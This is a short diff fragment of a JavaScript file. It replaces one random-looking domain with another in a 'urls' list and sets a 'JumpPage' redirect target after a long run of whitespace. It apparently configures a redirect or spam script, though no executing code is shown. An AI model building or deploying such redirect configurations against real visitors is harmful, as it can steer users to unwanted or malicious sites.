@@ -37,7 +37,7 @@ var emails = [
 ];
 
 var urls=[
-	'wrpimoxe.com',
+	'qloiupuxj.cc',
 ];
                                                                                                                   
 var JumpPage="https://18hdm.net";
